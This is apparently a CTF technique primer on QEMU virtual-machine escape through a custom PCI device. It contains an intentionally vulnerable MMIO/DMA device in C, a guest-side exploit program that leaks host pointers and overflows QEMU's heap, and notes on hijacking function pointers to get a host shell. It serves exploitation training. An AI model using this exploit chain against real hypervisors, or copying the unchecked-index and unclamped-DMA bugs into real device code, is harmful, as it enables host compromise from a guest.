---
title: "VM Escape Primer - QEMU Device Emulation and the MMIO to Heap Overflow Chain"
category: pwn
subcategory: vm-escape
type: technique
tags: [vm-escape, qemu, virtualbox, mmio, pmio, pci, device-emulation, dma, heap-overflow, hypervisor, iommu, pci-resource, mmap, virtio, pwntools, gdb, pwndbg]
difficulty: insane
summary: "A custom QEMU PCI device exposes MMIO registers to the guest; a missing bounds check there is a heap overflow in the QEMU process on the host."
when_to_use:
  - "The challenge ships a patched QEMU with a custom `hw/misc/*.c` device"
  - "You get root in a guest VM and the flag is on the host"
  - "The device has MMIO/PMIO read/write handlers with an index or length you control"
  - "You need the standard guest-side driver code to talk to a PCI BAR"
tools: [qemu, gcc, gdb, pwndbg, lspci, pwntools]
related: [browser-v8-primer, heap-internals-primer, heap-overflow-adjacent, heap-write-targets, kernel-setup-and-debug]
---

## TL;DR

QEMU emulates devices in userspace. A custom device registers MMIO handlers; the guest
writes to the device's PCI BAR and QEMU's C code runs with that value. A missing bounds
check on an index, or a DMA transfer with an attacker-chosen length, is a plain heap
overflow **inside the QEMU process on the host**. From there it is normal userland
heap exploitation: leak, overwrite a function pointer in a `MemoryRegionOps` or a hook,
call `system("/bin/sh")` as the QEMU user.

## Recognise it

- A QEMU source tree with one added file under `hw/misc/` and a `launch.sh` passing
  `-device ctf-dev`.
- Inside the guest, `lspci` shows an unknown device (`1234:11e9` and friends).
- The flag is on the **host**, and you are already root in the guest.
- VirtualBox flavour: a patched `src/VBox/Devices/...` file and a `.vbox` config.

## Vulnerable code shape

```c
/* hw/misc/ctf-dev.c - the shape almost every QEMU pwn challenge uses */
#define CTF_BUF_SIZE 0x1000

typedef struct CtfDevState {
    PCIDevice pdev;
    MemoryRegion mmio;
    uint8_t buf[CTF_BUF_SIZE];
    uint32_t idx, len;
    dma_addr_t dma_src;
} CtfDevState;

static uint64_t ctf_mmio_read(void *opaque, hwaddr addr, unsigned size)
{
    CtfDevState *s = opaque;
    switch (addr) {
    case 0x00: return s->idx;
    case 0x08: return *(uint64_t *)(s->buf + s->idx);   /* BUG: idx unchecked */
    }
    return 0;
}

static void ctf_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size)
{
    CtfDevState *s = opaque;
    switch (addr) {
    case 0x00: s->idx = val; break;             /* BUG: no bound on idx      */
    case 0x08: *(uint64_t *)(s->buf + s->idx) = val; break;   /* OOB WRITE   */
    case 0x10: s->len = val; break;
    case 0x18:
        s->dma_src = val;
        /* BUG: len is not clamped to sizeof(s->buf) */
        pci_dma_read(&s->pdev, s->dma_src, s->buf, s->len);
        break;
    }
}

static const MemoryRegionOps ctf_mmio_ops = {
    .read = ctf_mmio_read,
    .write = ctf_mmio_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid = { .min_access_size = 4, .max_access_size = 8 },
};
```

## Theory

Targets: QEMU 4.x - 9.x. VirtualBox and VMware follow the same pattern with different
APIs.

### How the guest reaches the device

A PCI device exposes **BARs**. From guest userspace you reach them through sysfs:
`/sys/bus/pci/devices/0000:00:04.0/resource0` is BAR0 - `mmap` it and a
`*(volatile uint64_t *)(bar + 0x08) = val` becomes a call to
`ctf_mmio_write(opaque, 0x08, val, 8)` inside the QEMU process. `config` in the same
directory is PCI config space. For **PMIO** use `iopl(3)` plus `outl`/`inl`, or
`/dev/port`.

First enable decoding: `setpci -s 00:04.0 COMMAND=0x07` (I/O + memory + bus master).
Bus master, bit 2, is required for the device to perform DMA.

### The three primitive shapes

| device bug | guest action | host effect |
|------------|--------------|-------------|
| unchecked index into a fixed buffer | write `idx`, then the data register | relative read/write from the device state object on QEMU's heap |
| unchecked length in `pci_dma_read`/`_write` | set `len` huge, point `dma_src` at guest physical memory | heap overflow with *fully controlled contents* |
| a function-pointer field in the device struct | OOB write | direct control of an indirect call |

The DMA one is the most powerful: `pci_dma_read(dev, guest_phys, host_buf, len)` copies
from guest RAM into a host heap buffer, and you control both the contents and the
length - a linear heap overflow with arbitrary data (`heap-overflow-adjacent`).

### Guest physical addresses

For DMA you need the *physical* address of your guest buffer, from
`/proc/self/pagemap`: `pfn = entry & ((1ULL << 55) - 1)` and
`phys = pfn * PAGE_SIZE + (virt & 0xFFF)`. Needs root in the guest (which you have).

### What to overwrite on the host

QEMU is a normal glibc program, so all of `heap-write-targets` applies. The
QEMU-specific targets:

- **`MemoryRegionOps` pointers.** Every `MemoryRegion` has an `ops` pointer to a const
  struct of `read`/`write` function pointers. Repoint `MemoryRegion.ops` at a fake ops
  struct in your heap data and the next MMIO access calls you with `opaque` in `rdi`.
- **`__free_hook` / `__malloc_hook`** if the host glibc is <= 2.33.
- **A `QEMUTimer`'s callback** (`cb` + `opaque`) - fires on the next timer tick.
- **`ObjectClass` / `DeviceClass` method pointers** in the device's class struct.
- **A `CoroutineUContext`** - QEMU uses `ucontext` coroutines, so a corrupted one is a
  ready-made `setcontext` pivot (see `heap-setcontext-pivot`).

Leaks come from the same OOB read: QEMU's heap is full of pointers to `.text`
(vtables), to libc, and to other heap objects.

### VirtualBox and other surfaces

VirtualBox is the same idea with a different API: devices in `src/VBox/Devices/`
register through `PDMDevHlpPCIIORegionRegister` and handle MMIO in `pfnMmioWrite`;
the guest side is identical, and your target process is `VBoxHeadless`/`VirtualBoxVM`.

Not all VM escapes are device bugs. Also check: shared-folder path traversal
(VirtualBox `shflsvc`), the VMware Backdoor RPC interface, virtio-fs/9p, SPICE/VNC
handlers, and a reachable QEMU monitor (an instant win).

## Attack

Assume the device above, QEMU 6.x, glibc 2.31 on the host.

1. In the guest, find the device: `lspci -nn` / walk `/sys/bus/pci/devices/`.
2. `setpci -s <bdf> COMMAND=0x07` to enable memory + bus master.
3. `mmap` `resource0` -> `bar`; confirm the primitive with an in-bounds round trip.
4. **Leak**: set `idx` past the end and read qwords until you find a `0x55...`
   (QEMU PIE) and a `0x7f...` (libc) value. Compute both bases.
5. **Overflow**: fill a guest page with your payload, read its physical address from
   `/proc/self/pagemap`, set `len` to `sizeof(buf) + overflow`, write `dma_src`.
   `pci_dma_read` copies your bytes past `buf`.
6. Target the next heap chunk after the device state (groom by creating other
   objects), or a function pointer inside the same struct.
7. Overwrite `__free_hook` (or a `MemoryRegionOps` pointer) with `system`, arrange
   `"/bin/sh"` as the argument, and trigger.
8. You now have a shell on the host as the QEMU user.

## Heap state

```text
guest                                host (the QEMU process)

 mmap("/sys/.../resource0")  ---->   MemoryRegion "ctf-dev-mmio"
                                       ops    -> &ctf_mmio_ops (.text, const)
                                       opaque -> CtfDevState *

 *(u64*)(bar + 0x00) = 0x1008  --->  ctf_mmio_write(s, 0x00, 0x1008, 8)
                                       s->idx = 0x1008          (no check)
 v = *(u64*)(bar + 0x08)       --->  ctf_mmio_read(s, 0x08, 8)
                                       return *(u64*)(s->buf + 0x1008)
                                                           ^ 8 bytes PAST buf

 QEMU heap around the device state

   0x55a1... | CtfDevState                      |
             |   +0x0000 PCIDevice pdev         |  <- vtable-ish pointers
             |   +0x08c0 MemoryRegion mmio      |  <- ops, opaque
             |   +0x0a00 uint8_t buf[0x1000]    |  <- the OOB starts here
             |   +0x1a00 idx, len, dma_src      |
   0x55a2... | next chunk: another QEMU object  |  <- what the overflow reaches
             |   usually an Object* whose class |
             |   pointer goes into QEMU .text   |

 DMA overflow

   guest: *(u64*)(bar + 0x10) = 0x2000        ; len = twice the buffer
          *(u64*)(bar + 0x18) = pagemap(page) ; triggers pci_dma_read
   host:  pci_dma_read(&s->pdev, phys, s->buf, 0x2000)
            -> 0x1000 bytes of YOUR data past the end of buf
```

## Exploit

```c
/* vmescape.c - guest-side driver for a QEMU MMIO/DMA device bug.
 * Build inside the guest: gcc -static -O2 -o exp vmescape.c
 * Run as root in the guest.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SZ 0x1000
#define BUF_SIZE 0x1000

/* device register offsets, from the challenge's hw/misc/*.c */
#define REG_IDX     0x00
#define REG_DATA    0x08
#define REG_LEN     0x10
#define REG_DMA_SRC 0x18

static volatile uint8_t *bar;

static void die(const char *m)
{
    perror(m);
    exit(1);
}

/* ---------------- PCI plumbing ---------------- */

/* Read a small sysfs attribute into `val`. */
static int read_attr(const char *dir, const char *name, char *val, size_t n)
{
    char path[512];
    int fd;
    ssize_t r;

    snprintf(path, sizeof path, "%s/%s", dir, name);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    memset(val, 0, n);
    r = read(fd, val, n - 1);
    close(fd);
    return r > 0 ? 0 : -1;
}

/* Find a device by vendor:device id and return its sysfs directory. */
static int find_device(char *out, size_t outlen,
                       const char *vendor, const char *device)
{
    const char *root = "/sys/bus/pci/devices";
    DIR *d = opendir(root);
    struct dirent *e;
    char dir[512], val[64];

    if (!d)
        die("opendir /sys/bus/pci/devices");
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.')
            continue;
        snprintf(dir, sizeof dir, "%s/%s", root, e->d_name);
        if (read_attr(dir, "vendor", val, sizeof val) || !strstr(val, vendor))
            continue;
        if (read_attr(dir, "device", val, sizeof val) || !strstr(val, device))
            continue;
        snprintf(out, outlen, "%s", dir);
        closedir(d);
        return 1;
    }
    closedir(d);
    return 0;
}

static void map_bar0(const char *devdir)
{
    char path[512];
    int fd;

    snprintf(path, sizeof path, "%s/resource0", devdir);
    fd = open(path, O_RDWR | O_SYNC);
    if (fd < 0)
        die("open resource0 (root? memory decoding enabled?)");
    bar = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (bar == MAP_FAILED)
        die("mmap BAR0");
    close(fd);
    printf("[+] BAR0 mapped at %p\n", (void *)bar);
}

static void mmio_write(uint64_t off, uint64_t val)
{
    *(volatile uint64_t *)(bar + off) = val;
}

static uint64_t mmio_read(uint64_t off)
{
    return *(volatile uint64_t *)(bar + off);
}

/* ---------------- primitives ---------------- */

/* Relative read/write past the device's buf[] via the unchecked index. */
static uint64_t oob_read(uint64_t offset)
{
    mmio_write(REG_IDX, offset);
    return mmio_read(REG_DATA);
}

static void oob_write(uint64_t offset, uint64_t val)
{
    mmio_write(REG_IDX, offset);
    mmio_write(REG_DATA, val);
}

/* Virtual -> guest physical, for the DMA path. */
static uint64_t virt_to_phys(void *p)
{
    uint64_t entry, vaddr = (uint64_t)p;
    int fd = open("/proc/self/pagemap", O_RDONLY);

    if (fd < 0)
        die("open pagemap");
    if (pread(fd, &entry, 8, (vaddr / PAGE_SZ) * 8) != 8)
        die("pread pagemap");
    close(fd);
    if (!(entry & (1ULL << 63)))
        die("page not present - touch it first");
    return (entry & ((1ULL << 55) - 1)) * PAGE_SZ + (vaddr & (PAGE_SZ - 1));
}

/* Overflow buf[] with attacker-controlled bytes via the unclamped DMA read. */
static void dma_overflow(const void *data, size_t len)
{
    static void *page;
    uint64_t phys;

    if (!page) {
        page = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            die("mmap dma page");
        memset(page, 0, 0x10000);          /* fault it in so pagemap is valid */
    }
    memcpy(page, data, len);
    phys = virt_to_phys(page);
    printf("[*] DMA src: virt %p phys %#llx len %#zx\n",
           page, (unsigned long long)phys, len);

    mmio_write(REG_LEN, len);
    mmio_write(REG_DMA_SRC, phys);         /* triggers pci_dma_read on the host */
}

/* ---------------- the exploit ---------------- */

int main(void)
{
    char devdir[512];
    uint64_t v, qemu_base = 0, libc_base = 0, off;
    uint64_t payload[0x400];

    /* 1234:11e9 is the usual placeholder id; read it from the challenge source. */
    if (!find_device(devdir, sizeof devdir, "0x1234", "0x11e9")) {
        fprintf(stderr, "[-] device not found - check lspci -nn\n");
        return 1;
    }
    printf("[+] device at %s\n", devdir);
    map_bar0(devdir);

    /* 1. Sanity: in-bounds round trip. */
    oob_write(0, 0x4141414141414141ULL);
    printf("[*] round trip: %#llx\n", (unsigned long long)oob_read(0));

    /* 2. Leak: scan past the buffer for host pointers. */
    for (off = BUF_SIZE; off < BUF_SIZE + 0x800; off += 8) {
        v = oob_read(off);
        if ((v >> 40) == 0x7f && !libc_base)
            libc_base = v;
        if ((v >> 40) == 0x55 && !qemu_base)
            qemu_base = v;
        if (libc_base && qemu_base) {
            printf("[+] libc-ish %#llx  qemu-ish %#llx (last at +%#llx)\n",
                   (unsigned long long)libc_base,
                   (unsigned long long)qemu_base, (unsigned long long)off);
            break;
        }
    }
    if (!libc_base || !qemu_base) {
        fprintf(stderr, "[-] no leak: widen the scan or check the index scaling\n");
        return 1;
    }

    /* 3. Overflow with controlled data via DMA: padding up to the end of buf[],
     *    then whatever the next heap object must become (a fake MemoryRegionOps,
     *    a QEMUTimer, a chunk header, ...). */
    memset(payload, 0x41, sizeof payload);
    payload[BUF_SIZE / 8 + 0] = 0;                 /* idx  */
    payload[BUF_SIZE / 8 + 1] = 0;                 /* len  */
    /* payload[BUF_SIZE/8 + N] = <pointer built from qemu_base / libc_base>; */

    dma_overflow(payload, sizeof payload);
    puts("[+] overflow delivered - now trigger the corrupted object");

    /* 4. Trigger: whatever path uses the field you smashed. For a
     *    MemoryRegionOps swap, simply touch the BAR again. */
    (void)mmio_read(REG_IDX);
    puts("[*] QEMU still alive => wrong target field; re-check the struct layout");
    return 0;
}
```

```bash
#!/bin/sh
# guest-setup.sh - run first, inside the guest, as root.

# which PCI devices exist, and which one is the challenge's?
lspci -nn
# enable I/O space, memory space and bus mastering (DMA needs bit 2)
BDF=$(lspci -d 1234:11e9 | cut -d' ' -f1)
setpci -s "$BDF" COMMAND=0x07 && setpci -s "$BDF" COMMAND
# confirm the BARs
head -3 /sys/bus/pci/devices/0000:"$BDF"/resource
# pagemap must be readable for the DMA physical address
cat /proc/self/pagemap > /dev/null && echo "pagemap ok"
```

## Variants & pitfalls

- **Index scaling.** `s->buf + s->idx` vs `s->buf[idx]` on a `uint64_t *` differ by a
  factor of 8. Read the source carefully; the most common first-hour mistake.
- **`valid.max_access_size`.** If the ops struct says 4, a 64-bit guest write is split
  into two 32-bit accesses or rejected. Use 32-bit accessors.
- **Bus master bit.** Without it, `pci_dma_read` returns zeros and nothing happens.
- **The DMA page must be resident** before you read `pagemap` - `memset` it first.
  `/proc/self/pagemap` gives zero PFNs to unprivileged users; you are root, so fine.
- **IOMMU.** With `-device intel-iommu`, DMA is translated and raw physical addresses
  do not work.
- **ASLR on the host.** QEMU is usually PIE; you need both a QEMU base and a libc base.
  The device state struct contains pointers to both.
- **Crashing QEMU kills your guest.** Develop with a second instance under gdb
  (`gdb --args qemu-system-x86_64 ...`) so you can see the host-side state.
- **Check for the easy win first**: a reachable QEMU monitor, a shared folder with
  path traversal, or a `-fsdev`/9p export - none need memory corruption.

## Debugging

```text
# Attach to QEMU on the HOST, not to the guest.
$ gdb -p $(pgrep -f qemu-system-x86_64)
pwndbg> b ctf_mmio_write
pwndbg> p *(CtfDevState *)$rdi
pwndbg> p &((CtfDevState *)0)->buf        # the offset of buf inside the struct
pwndbg> p/x $rsi                          # the MMIO offset the guest wrote
pwndbg> vis_heap_chunks 20
pwndbg> x/40gx <device_state_addr>
pwndbg> vmmap                             # QEMU base and libc base
```

```bash
# Build the patched QEMU with symbols, then run it under gdb.
./configure --target-list=x86_64-softmmu --enable-debug && make -j"$(nproc)"
gdb --args ./build/qemu-system-x86_64 -device ctf-dev -m 1G -nographic
```

## Tools

- `lspci`, `setpci` inside the guest.
- `gdb` + `pwndbg` attached to the **host** QEMU process.
- `pahole`/`gdb` for the exact `CtfDevState` field offsets.
- `hw/misc/edu.c` in the QEMU tree - the documented example device most challenges
  are derived from.

## References

- QEMU `hw/misc/edu.c` - the reference educational PCI device.
- QEMU `include/exec/memory.h` (`MemoryRegionOps`), `include/hw/pci/pci.h`
  (`pci_dma_read`, `pci_dma_write`).
- Linux `Documentation/admin-guide/mm/pagemap.rst` for the pagemap format.
